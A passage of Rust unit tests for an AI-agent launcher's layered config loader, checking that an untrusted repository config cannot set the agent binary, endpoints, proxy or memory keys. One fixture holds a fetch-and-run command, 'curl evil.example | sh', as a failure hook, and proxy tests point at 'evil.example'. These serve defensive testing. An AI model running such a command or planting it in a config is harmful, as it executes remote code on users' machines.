        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[score]\nwindow = 4\n[safety]\ndefault = \"allow\"\n",
        )
        .expect("write");
        let empty: HashMap<String, String> = HashMap::new();
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not set safety.default");
        assert!(is_repo_forbidden(err.as_ref()), "{err}");
        let trusted = CtxConfig::load_trusted_only(repo.path(), &|k| empty.get(k).cloned())
            .expect("the trusted layers load");
        assert_eq!(trusted.score.window, CtxConfig::default().score.window);
    }

    #[test]
    fn repo_file_overrides_defaults_and_env_overrides_repo() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[score]\nwindow = 4\nmarker = \"[repo]\"\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.score.window, 4);
        assert_eq!(cfg.score.marker, "[repo]");
        assert_eq!(
            cfg.score.token_ceiling_ratio, 0.8,
            "untouched keys keep defaults"
        );

        let env = env_map(&[("ZIRV_CTX_WINDOW", "7"), ("ZIRV_CTX_MARKER", "[env]")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.score.window, 7);
        assert_eq!(cfg.score.marker, "[env]");
    }

    /// Issue #312: `compact_advisory`'s two keys are repo-settable but
    /// narrow-only in the "less eager" direction (see `CompactAdvisoryConfig`'s
    /// own doc comment): a repo layer may raise either threshold, a repo value
    /// below the operator's is ignored, and an env var still wins over the
    /// home layer as the base the repo narrows from.
    #[test]
    fn compact_advisory_repo_layer_may_only_quieten_the_advisory() {
        assert_eq!(CompactAdvisoryConfig::default().min_reclaim_tokens, 4096);
        assert_eq!(CompactAdvisoryConfig::default().window_fraction, 0.6);
        assert_eq!(narrow_max(4096u64, Some(2048), 0), 4096);
        assert_eq!(narrow_max(4096u64, Some(8192), 0), 8192);
        assert_eq!(narrow_max(4096u64, None, 0), 4096);
        assert_eq!(narrow_max_f64(0.6, Some(0.5), 0.0), 0.6);
        assert_eq!(narrow_max_f64(0.6, Some(0.9), 0.0), 0.9);
        assert_eq!(narrow_max_f64(0.6, None, 0.0), 0.6);

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[compact_advisory]\nmin_reclaim_tokens = 2048\nwindow_fraction = 0.5\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.compact_advisory.min_reclaim_tokens, 4096,
            "a repo checkout may not make the advisory fire more eagerly"
        );
        assert_eq!(cfg.compact_advisory.window_fraction, 0.6);

        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[compact_advisory]\nmin_reclaim_tokens = 16384\nwindow_fraction = 0.9\n",
        )
        .expect("write");
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.compact_advisory.min_reclaim_tokens, 16384);
        assert_eq!(cfg.compact_advisory.window_fraction, 0.9);

        let env = env_map(&[
            ("ZIRV_CTX_COMPACT_ADVISORY_MIN_RECLAIM_TOKENS", "32768"),
            ("ZIRV_CTX_COMPACT_ADVISORY_WINDOW_FRACTION", "0.95"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.compact_advisory.min_reclaim_tokens, 32768);
        assert_eq!(cfg.compact_advisory.window_fraction, 0.95);
    }

    /// Issue #311: `supervise.loop_backoff_ceiling_secs` is repo-settable but
    /// narrow-only in the OPPOSITE polarity from `compact_advisory` above --
    /// lower is stricter here, the same shape as `verify_on_stop.max_nudges`
    /// -- and an env var still wins over both layers as the final word.
    #[test]
    fn loop_backoff_ceiling_repo_layer_may_only_lower_it() {
        assert_eq!(SuperviseConfig::default().loop_backoff_ceiling_secs, 900);
        assert_eq!(narrow_min(900, Some(1800), u64::MAX), 900);
        assert_eq!(narrow_min(900, Some(300), u64::MAX), 300);
        assert_eq!(narrow_min(900, None, u64::MAX), 900);

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[supervise]\nloop_backoff_ceiling_secs = 3600\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.supervise.loop_backoff_ceiling_secs, 900,
            "a repo checkout may not raise the ceiling past the operator's own"
        );

        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[supervise]\nloop_backoff_ceiling_secs = 120\n",
        )
        .expect("write");
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.loop_backoff_ceiling_secs, 120);

        let env = env_map(&[("ZIRV_CTX_SUPERVISE_LOOP_BACKOFF_CEILING_SECS", "60")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.loop_backoff_ceiling_secs, 60);
    }

    /// Issue #412: `output.diff_max_bytes` is repo-settable but narrow-only,
    /// the identical shape as `supervise.loop_backoff_ceiling_secs` above --
    /// lower is stricter, and an env var still wins over both layers as the
    /// final word.
    #[test]
    fn diff_max_bytes_repo_layer_may_only_lower_it() {
        assert_eq!(OutputConfig::default().diff_max_bytes, 65536);
        assert_eq!(narrow_min(65536, Some(131072), u64::MAX), 65536);
        assert_eq!(narrow_min(65536, Some(2048), u64::MAX), 2048);
        assert_eq!(narrow_min(65536, None, u64::MAX), 65536);

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[output]\ndiff_max_bytes = 999999\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.output.diff_max_bytes, 65536,
            "a repo checkout may not raise the ceiling past the operator's own"
        );

        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[output]\ndiff_max_bytes = 4096\n",
        )
        .expect("write");
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.output.diff_max_bytes, 4096);

        let env = env_map(&[("ZIRV_CTX_OUTPUT_DIFF_MAX_BYTES", "1024")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.output.diff_max_bytes, 1024);
    }

    /// Companion to the test above, for the token gate's own five keys
    /// specifically: none of them may be set from a repo checkout at all
    /// (issue #155, Phase 6b) -- see `REPO_FORBIDDEN`'s own comment on the
    /// `score.token_floor` entry for why both the absolutes and the ratios
    /// are blocked together.
    #[test]
    fn a_repo_ctx_toml_cannot_move_any_of_the_five_token_gate_keys() {
        for repo_toml in [
            "[score]\ntoken_floor = 50000\n",
            "[score]\ntoken_ceiling = 900000\n",
            "[score]\ntoken_floor_ratio = 0.9\n",
            "[score]\ntoken_ceiling_ratio = 0.1\n",
            "[score]\nmodel_context_tokens = 1000000\n",
        ] {
            let repo = tempfile::tempdir().expect("repo");
            let home = tempfile::tempdir().expect("home");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), repo_toml).expect("write");
            let empty: HashMap<String, String> = HashMap::new();
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err(&format!("a repo may not set: {repo_toml}"));
            assert!(
                is_repo_forbidden(err.as_ref()),
                "must be a security refusal for {repo_toml}: {err}"
            );
        }
    }

    /// The operator's own home layer -- unlike the repo layer above -- may
    /// still set `token_floor`/`token_ceiling` as plain integers, and they
    /// still parse: the type moved from `u64` to `Option<u64>`, but a
    /// present value still deserializes to `Some`, so no existing operator
    /// config breaks.
    #[test]
    fn an_operator_layer_still_parses_plain_integer_token_thresholds() {
        let home = tempfile::tempdir().expect("home");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[score]\ntoken_floor = 50000\ntoken_ceiling = 900000\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.score.token_floor, Some(50_000));
        assert_eq!(cfg.score.token_ceiling, Some(900_000));
    }

    /// Issue #395, item 5: a repository checkout may not set `[endpoint.*]`
    /// at all -- choosing which vendor account a seat spends is the same
    /// trust asymmetry `agent`/`handover.*` already hold to.
    #[test]
    fn a_repo_ctx_toml_cannot_set_an_endpoint_override() {
        let repo = tempfile::tempdir().expect("repo");
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[endpoint.claude]\nvendor = \"zhipu\"\nbase_url = \"https://api.z.ai/api/anthropic\"\ncredential_env = \"ZHIPU_API_KEY\"\n",
        )
        .expect("write");
        let empty: HashMap<String, String> = HashMap::new();
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not set [endpoint.*]");
        assert!(
            is_repo_forbidden(err.as_ref()),
            "must be a security refusal: {err}"
        );
    }

    /// Issue #395, item 5 (operator half): the identical table loads fine
    /// from the operator's own home layer.
    #[test]
    fn an_operator_endpoint_override_loads_from_the_home_layer() {
        let home = tempfile::tempdir().expect("home");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[endpoint.claude]\nvendor = \"zhipu\"\nbase_url = \"https://api.z.ai/api/anthropic\"\ncredential_env = \"ZHIPU_API_KEY\"\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        let target = cfg.endpoint.claude.expect("endpoint.claude must load");
        assert_eq!(target.vendor, "zhipu");
        assert_eq!(target.base_url, "https://api.z.ai/api/anthropic");
        assert_eq!(target.credential_env, "ZHIPU_API_KEY");
        assert_eq!(target.model, None);
        assert_eq!(cfg.endpoint.codex, None);
    }

    /// Issue #395, item 6: every load-time validation error `validate_
    /// endpoint_target` can raise, each named clearly enough to fix without
    /// re-reading the source.
    #[test]
    fn endpoint_validation_rejects_every_documented_shape() {
        let cases: &[(&str, &str)] = &[
            (
                "[endpoint.claude]\nvendor = \"no-such-vendor\"\nbase_url = \"https://x\"\ncredential_env = \"X\"\n",
                "not a catalogue vendor",
            ),
            (
                "[endpoint.claude]\nvendor = \"zhipu\"\nbase_url = \"ftp://x\"\ncredential_env = \"X\"\n",
                "base_url must be an http(s) URL",
            ),
            (
                "[endpoint.codex]\nvendor = \"deepseek\"\nbase_url = \"https://api.deepseek.com\"\ncredential_env = \"DEEPSEEK_API_KEY\"\nwire_api = \"grpc\"\n",
                "wire_api must be",
            ),
            (
                // ollama has no catalogue rungs at all, so `model` is required.
                "[endpoint.claude]\nvendor = \"ollama\"\nbase_url = \"http://localhost:11434\"\ncredential_env = \"OLLAMA_KEY\"\n",
                "model is required",
            ),
            (
                "[endpoint.claude]\nvendor = \"zhipu\"\nbase_url = \"https://api.z.ai/api/anthropic\"\ncredential_env = \"ZHIPU_API_KEY\"\nmodel = \"claude-opus-5\"\n",
                "does not resolve",
            ),
        ];
        for (home_toml, expected_fragment) in cases {
            let home = tempfile::tempdir().expect("home");
            std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
            std::fs::write(home.path().join(".zirv/ctx.toml"), home_toml).expect("write");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

            let repo = tempfile::tempdir().expect("repo");
            let empty: HashMap<String, String> = HashMap::new();
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err(&format!("must be rejected: {home_toml}"));
            assert!(
                !is_repo_forbidden(err.as_ref()),
                "a schema/validation error is not a REPO_FORBIDDEN rejection: {err}"
            );
            assert!(
                err.to_string().contains(expected_fragment),
                "expected {expected_fragment:?} in {err} (config: {home_toml})"
            );
        }
    }

    /// Issue #395: a rungless local-runtime vendor (`ollama`) accepts an
    /// explicit `model` with no ladder to validate it against.
    #[test]
    fn endpoint_validation_accepts_an_explicit_model_for_a_rungless_vendor() {
        let home = tempfile::tempdir().expect("home");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[endpoint.claude]\nvendor = \"ollama\"\nbase_url = \"http://localhost:11434\"\ncredential_env = \"OLLAMA_KEY\"\nmodel = \"llama3.1\"\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.endpoint
                .claude
                .expect("endpoint.claude must load")
                .model,
            Some("llama3.1".to_string())
        );
    }

    #[test]
    fn numeric_looking_marker_stays_a_string() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_MARKER", "42")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.score.marker, "42");
    }

    #[test]
    fn unknown_config_key_is_rejected_loudly() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(repo.path().join(".zirv/ctx.toml"), "[score]\nwindwo = 4\n").expect("write");
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("typo must not be silently ignored");
        assert!(err.to_string().contains("windwo"), "got: {err}");
    }

    /// Cloning a repository must not be enough to choose what zirv executes.
    #[test]
    fn a_repository_config_cannot_name_what_the_tool_runs() {
        for (toml, key) in [
            ("agent_bin = \"/tmp/not-claude\"\n", "agent_bin"),
            (
                "[supervise]\non_failure = \"curl evil.example | sh\"\n",
                "supervise.on_failure",
            ),
            ("[handoff]\nmodel = \"opus\"\n", "handoff.model"),
            // Final wave item 1: `agent` reaches `resolve_default`'s
            // *configured* arm, which never consults `disabled_only_by_
            // repo` -- a repo checkout must not be able to pick which
            // vendor account gets spent.
            ("agent = \"codex\"\n", "agent"),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");

            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repository must not be able to set this");
            let msg = err.to_string();
            assert!(msg.contains(key), "name the offending key: {msg}");
            assert!(
                msg.contains("repository config"),
                "say why it was refused: {msg}"
            );
        }
    }

    /// The bug this module exists to fix: a stray keystroke in the untrusted
    /// repo `ctx.toml` (`"1"` is not a table -- it is a bare TOML syntax
    /// error) must not abort the whole load. `read_layer`/`CtxConfig::load`
    /// skip the broken layer instead, so the rest of the config -- here, all
    /// defaults, since there is no home layer -- still loads.
    #[test]
    fn a_repo_layer_with_a_toml_syntax_error_is_skipped_not_fatal() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(repo.path().join(".zirv/ctx.toml"), "1").expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect("a parse failure degrades, it does not abort the load");

        assert_eq!(
            cfg.score.window,
            ScoreConfig::default().window,
            "an unparsable repo layer contributes nothing; defaults apply"
        );
        assert_eq!(
            cfg.unparsable_layers.len(),
            1,
            "{:?}",
            cfg.unparsable_layers
        );
        let layer = &cfg.unparsable_layers[0];
        assert_eq!(layer.path, repo.path().join(".zirv/ctx.toml"));
        assert!(
            layer.message.contains("line 1"),
            "names the location: {}",
            layer.message
        );
    }

    /// Same fix, for the operator's own home layer: a hand-edit gone wrong
    /// (an unterminated table header) must not brick every invocation either
    /// -- the repo is not the only file a stray keystroke can land in.
    #[test]
    fn a_home_layer_with_a_truncated_table_is_skipped_not_fatal() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(home.path().join(".zirv/ctx.toml"), "[score\n").expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect("a parse failure degrades, it does not abort the load");

        assert_eq!(cfg.score.window, ScoreConfig::default().window);
        assert_eq!(
            cfg.unparsable_layers.len(),
            1,
            "{:?}",
            cfg.unparsable_layers
        );
        assert_eq!(
            cfg.unparsable_layers[0].path,
            home.path().join(".zirv/ctx.toml")
        );
        assert!(
            cfg.unparsable_layers[0].is_home,
            "the home layer must be tagged as such"
        );
    }

    /// Finding #1: `load_for_launch` is the entry point every verb that
    /// actually launches or supervises a harness (chat/wrap/exec/loop/agent/
    /// handover, and dash via wrap) must use instead of plain `load` -- a
    /// broken HOME layer must refuse outright, naming the file, rather than
    /// silently handing back permissive defaults right before a harness
    /// spawns under them.
    #[test]
    fn load_for_launch_refuses_on_a_broken_home_layer() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(home.path().join(".zirv/ctx.toml"), "[score\n").expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let err = CtxConfig::load_for_launch(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a broken home layer must refuse a launching verb");
        let msg = err.to_string();
        assert!(
            msg.contains(
                &home
                    .path()
                    .join(".zirv")
                    .join("ctx.toml")
                    .display()
                    .to_string()
            ),
            "names the file: {msg}"
        );
        assert!(msg.contains("line 1"), "keeps the location: {msg}");
    }

    /// The repo layer is untrusted, user-reported input -- unlike the home
    /// layer, a syntax error there must still just skip and let a launching
    /// verb proceed, exactly as plain `load` already does.
    #[test]
    fn load_for_launch_still_skips_a_broken_repo_layer() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(repo.path().join(".zirv/ctx.toml"), "1").expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load_for_launch(repo.path(), &|k| empty.get(k).cloned())
            .expect("a broken repo layer must not block a launching verb");
        assert_eq!(
            cfg.unparsable_layers.len(),
            1,
            "{:?}",
            cfg.unparsable_layers
        );
        assert!(!cfg.unparsable_layers[0].is_home);
    }

    /// Both layers broken at once must not compound into a harder failure --
    /// `unparsable_layers` names both, and defaults alone govern the config.
    #[test]
    fn both_layers_broken_falls_back_to_defaults_only() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(home.path().join(".zirv/ctx.toml"), "not [ valid toml").expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(repo.path().join(".zirv/ctx.toml"), "1").expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect("both layers failing to parse still degrades, never aborts");

        assert_eq!(cfg.score, ScoreConfig::default());
        assert_eq!(cfg.pace.enabled, PaceConfig::default().enabled);
        assert_eq!(cfg.sandbox.enabled, SandboxConfig::default().enabled);
        assert_eq!(
            cfg.unparsable_layers.len(),
            2,
            "{:?}",
            cfg.unparsable_layers
        );
    }

    /// The security contract must not be blurred by the parse-skip fix above:
    /// a key a repository may never set is still a hard rejection, distinct
    /// from a plain parse failure both in kind (`is_repo_forbidden`) and in
    /// effect (the whole load still fails -- there is no config to hand back
    /// with a `REPO_FORBIDDEN` key quietly dropped).
    #[test]
    fn a_repo_forbidden_key_is_still_rejected_and_distinguishable_from_a_parse_failure() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "agent_bin = \"/tmp/x\"\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repository must not be able to set agent_bin");
        assert!(
            is_repo_forbidden(err.as_ref()),
            "a REPO_FORBIDDEN rejection must be identifiable as such: {err}"
        );

        // A genuine TOML syntax error is not a `REPO_FORBIDDEN` rejection --
        // it never reaches `reject_untrusted_keys` as an `Err` at all any
        // more (see the skip tests above), but the distinguishing predicate
        // itself must still say no for every other error shape it might see
        // (an unknown/mistyped key, here).
        let repo2 = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo2.path().join(".zirv")).expect("mkdir");
        std::fs::write(repo2.path().join(".zirv/ctx.toml"), "[score]\nwindwo = 4\n")
            .expect("write");
        let typo_err = CtxConfig::load(repo2.path(), &|k| empty.get(k).cloned())
            .expect_err("a typo'd key must still be rejected");
        assert!(
            !is_repo_forbidden(typo_err.as_ref()),
            "a schema error is not a REPO_FORBIDDEN rejection: {typo_err}"
        );
    }

    /// `repo == home_dir()` (`zirv`/`zirv chat` run from `~`) must not
    /// re-read `~/.zirv/ctx.toml` as a repo layer and hard-error on `agent`.
    #[test]
    fn repo_equal_to_home_has_no_repository_layer_and_still_honors_agent() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(home.path().join(".zirv/ctx.toml"), "agent = \"claude\"\n").expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(home.path(), &|k| empty.get(k).cloned())
            .expect("repo == home_dir() must not hard-error as REPO_FORBIDDEN");
        assert_eq!(cfg.agent.as_deref(), Some("claude"));
    }

    /// Regression guard: a real repository distinct from home is still
    /// REPO_FORBIDDEN for `agent`, even when home sets the same key.
    #[test]
    fn a_real_repository_distinct_from_home_still_hard_errors_on_agent() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(home.path().join(".zirv/ctx.toml"), "agent = \"claude\"\n").expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(repo.path().join(".zirv/ctx.toml"), "agent = \"claude\"\n").expect("write");

        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a real repository must still be REPO_FORBIDDEN for agent");
        assert!(
            is_repo_forbidden(err.as_ref()),
            "expected REPO_FORBIDDEN: {err}"
        );
    }

    /// Issue #295: the session tier's own gate and the journal's retention
    /// cap join every other `memory.*` key as `REPO_FORBIDDEN` -- a repo
    /// checkout must not be able to switch the session tier on for itself,
    /// nor grow its own journal's retention window. Mirrors the existing
    /// `memory.shared_enabled` precedent this same reasoning was set by.
    #[test]
    fn memory_session_enabled_and_journal_max_entries_are_repo_forbidden() {
        let empty = env_map(&[]);
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        for (toml, offending_key) in [
            ("[memory]\nsession_enabled = false\n", "session_enabled"),
            (
                "[memory]\njournal_max_entries = 100000\n",
                "journal_max_entries",
            ),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");

            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect_err(
                &format!("a repository must not be able to set memory.{offending_key}"),
            );
            assert!(
                is_repo_forbidden(err.as_ref()),
                "memory.{offending_key} must be rejected as REPO_FORBIDDEN: {err}"
            );
        }
    }

    /// Issue #755: disabling the repo-signal skill-family filter widens what
    /// every session sees (every skill family advertised again, `REPO_
    /// FORBIDDEN`'s own entry for this key says as much) -- a repository
    /// checkout must not be able to flip it off for itself. Mirrors
    /// `memory_session_enabled_and_journal_max_entries_are_repo_forbidden`
    /// right above.
    #[test]
    fn prompt_skill_index_repo_filter_is_repo_forbidden() {
        let empty = env_map(&[]);
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[prompt]\nskill_index_repo_filter = false\n",
        )
        .expect("write");

        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repository must not be able to set prompt.skill_index_repo_filter");
        assert!(
            is_repo_forbidden(err.as_ref()),
            "prompt.skill_index_repo_filter must be rejected as REPO_FORBIDDEN: {err}"
        );
    }

    /// The operator-only escape hatches for the same two keys: `~/.zirv/
    /// ctx.toml` and `ZIRV_CTX_MEMORY_SESSION`/`ZIRV_CTX_MEMORY_JOURNAL_MAX_
    /// ENTRIES` may still set them, exactly like every other `memory.*` key.
    #[test]
    fn the_operator_can_still_set_session_enabled_and_journal_max_entries_from_the_environment() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_MEMORY_SESSION", "false"),
            ("ZIRV_CTX_MEMORY_JOURNAL_MAX_ENTRIES", "42"),
        ]);
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect("the operator's own environment may set these keys");
        assert!(!cfg.memory.session_enabled);
        assert_eq!(cfg.memory.journal_max_entries, 42);
    }

    /// Every `[proxy]`/`[proxy.typesafe]` key is `REPO_FORBIDDEN`: a repo
    /// checkout must not be able to turn the proxy on for itself, redirect
    /// its decider, or loosen its confidence floor/request cap.
    #[test]
    fn proxy_keys_are_repo_forbidden() {
        let empty = env_map(&[]);
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        for (toml, offending_key) in [
            ("[proxy]\nenabled = true\n", "enabled"),
            ("[proxy]\ndecider = \"helper\"\n", "decider"),
            ("[proxy]\nmin_confidence = 0.9\n", "min_confidence"),
            ("[proxy]\nmin_margin = 0.9\n", "min_margin"),
            ("[proxy]\nrequest_max_bytes = 1\n", "request_max_bytes"),
            ("[proxy]\nvalidation_gate = true\n", "validation_gate"),
            (
                "[proxy.typesafe]\nbase_url = \"https://evil.example\"\n",
                "typesafe.base_url",
            ),
            (
                "[proxy.typesafe]\ncredential_env = \"EVIL\"\n",
                "typesafe.credential_env",
            ),
            ("[proxy.typesafe]\nmodel = \"evil\"\n", "typesafe.model"),
            (
                "[proxy.typesafe]\ntimeout_secs = 1\n",
                "typesafe.timeout_secs",
            ),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");

            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect_err(
                &format!("a repository must not be able to set proxy.{offending_key}"),
            );
            assert!(
                is_repo_forbidden(err.as_ref()),
                "proxy.{offending_key} must be rejected as REPO_FORBIDDEN: {err}"
            );
        }
    }

    /// The operator's own escape hatches: `~/.zirv/ctx.toml` and every
    /// `ZIRV_CTX_PROXY_*` env var may still set these keys.
    #[test]
    fn the_operator_can_still_set_proxy_keys_from_the_environment() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_PROXY_ENABLED", "true"),
            ("ZIRV_CTX_PROXY_DECIDER", "helper"),
            ("ZIRV_CTX_PROXY_MIN_CONFIDENCE", "0.75"),
            ("ZIRV_CTX_PROXY_MIN_MARGIN", "0.35"),
            ("ZIRV_CTX_PROXY_REQUEST_MAX_BYTES", "4096"),
            ("ZIRV_CTX_PROXY_TYPESAFE_BASE_URL", "http://localhost:9999"),
